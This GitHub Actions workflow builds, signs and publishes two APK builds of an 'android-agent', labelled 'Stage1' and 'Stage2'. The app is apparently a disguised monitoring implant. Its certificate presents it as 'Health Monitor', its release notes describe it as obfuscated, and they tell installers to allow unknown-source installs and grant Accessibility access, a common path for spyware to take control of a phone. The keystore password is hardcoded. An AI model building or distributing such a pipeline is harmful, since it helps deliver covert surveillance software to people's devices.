name: Build Android APK

on:
  push:
    paths:
      - 'android-agent/**'
      - '.github/workflows/build-android.yml'
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Accept SDK licenses and install build tools
        run: |
          yes | ${ANDROID_HOME}/cmdline-tools/latest/bin/sdkmanager --licenses || true
          ${ANDROID_HOME}/cmdline-tools/latest/bin/sdkmanager \
            "platforms;android-34" \
            "build-tools;34.0.0"

      - name: Generate release keystore
        run: |
          keytool -genkeypair -v \
            -keystore android-agent/release.jks \
            -keyalg RSA -keysize 2048 -validity 10000 \
            -alias release \
            -dname "CN=Health Monitor, OU=Services, O=Mobile, L=London, S=England, C=GB" \
            -storepass healthmon2024 -keypass healthmon2024

      - name: Generate Gradle wrapper
        run: |
          wget -q https://services.gradle.org/distributions/gradle-8.6-bin.zip
          unzip -q gradle-8.6-bin.zip
          ./gradle-8.6/bin/gradle wrapper \
            --project-dir android-agent \
            --gradle-version=8.6 \
            --distribution-type=bin
          chmod +x android-agent/gradlew

      - name: Build both APK variants
        working-directory: android-agent
        run: ./gradlew assembleLiteRelease assembleFullRelease --no-daemon

      - name: Rename APKs
        run: |
          cp android-agent/app/build/outputs/apk/lite/release/app-lite-release.apk agent.apk
          cp android-agent/app/build/outputs/apk/full/release/app-full-release.apk agent-full.apk
          echo "Stage1: $(du -h agent.apk | cut -f1)  Stage2: $(du -h agent-full.apk | cut -f1)"

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: agent-apks
          path: |
            agent.apk
            agent-full.apk

      - name: Delete old release
        run: gh release delete latest-agent --yes 2>/dev/null || true
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: latest-agent
          name: "Android Agent APK"
          body: |
            Latest build — release-signed, R8-obfuscated.
            **Install:** Settings → Security → enable Install unknown apps for Chrome, then open the APK.
            **Setup:** open once → tap Enable Monitoring Access → enable in Accessibility settings.
          files: |
            agent.apk
            agent-full.apk
          make_latest: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
